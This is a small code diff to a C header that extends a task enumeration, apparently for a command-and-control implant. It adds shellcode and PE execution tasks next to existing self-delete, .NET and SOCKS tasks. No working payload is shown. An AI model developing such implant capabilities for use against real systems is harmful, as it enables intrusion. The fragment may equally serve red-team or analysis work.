@@ -219,7 +219,10 @@ enum {
     TkSelfDelete,
     TkExit,
     TkDotnet,
-    TkSocks
+    TkSocks,
+    TkExecSc,
+    TkExecPE,
+    TaskLast
 } KH_TASKS;
 
 enum {
@@ -235,7 +238,7 @@ enum {
     UpChunk
 } KH_UP;
 
-#define TSK_LENGTH ( TkSocks - 9 )
+#define TSK_LENGTH ( TaskLast - 9 )
 
 enum {
     SbCfgSleep = 15,
